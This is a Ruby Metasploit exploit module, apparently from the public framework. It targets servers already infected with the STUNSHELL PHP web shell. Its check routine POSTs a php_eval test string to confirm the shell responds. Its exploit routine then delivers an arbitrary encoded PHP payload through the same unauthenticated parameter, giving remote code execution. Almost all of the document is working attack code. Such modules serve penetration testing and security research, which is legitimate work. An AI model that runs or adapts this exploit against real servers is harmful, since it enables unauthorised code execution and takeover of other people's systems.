##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'STUNSHELL Web Shell Remote PHP Code Execution',
      'Description'    => %q{
          This module exploits unauthenticated versions of the "STUNSHELL" web shell.
        This module works when safe mode is enabled on the web server. This shell is widely
        used in automated RFI payloads.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'bwall <bwall[at]openbwall.com>' # vuln discovery & msf module
        ],
      'References'     =>
        [
          ['OSVDB', '91842'],
          ['URL', 'https://defense.ballastsecurity.net/wiki/index.php/STUNSHELL'],
          ['URL', 'https://defense.ballastsecurity.net/decoding/index.php?hash=a4cd8ba05eb6ba7fb86dd66bed968007']
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Keys'        => ['php'],
          'Space'       => 10000,
          'DisableNops' => true
        },
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          ['stunshell', {}]
        ],
      'DisclosureDate' => '2013-03-23',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI',[true, "The path to the andalas_oku shell", "/IDC.php"]),
      ])
  end

  def check
    uri = normalize_uri(target_uri.path.to_s)
    request_parameters = {
      'method'	=> 'POST',
      'uri'		=> uri,
      'vars_post'	=>
        {
          'cmd' => "php_eval",
          'php_eval' => "print 'andalas_oku test parameter';"
        }
    }
    shell = send_request_cgi(request_parameters)
    if (shell and shell.body =~ /andalas_oku test parameter/)
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def http_send_command(cmd)
    uri = normalize_uri(target_uri.path.to_s)
    request_parameters = {
      'method'	=> 'POST',
      'uri'		=> uri,
      'vars_post'	=>
        {
          'cmd' => "php_eval",
          "php_eval" => cmd
        }
    }
    res = send_request_cgi(request_parameters)
  end

  def exploit
    http_send_command(payload.encoded)
  end
end
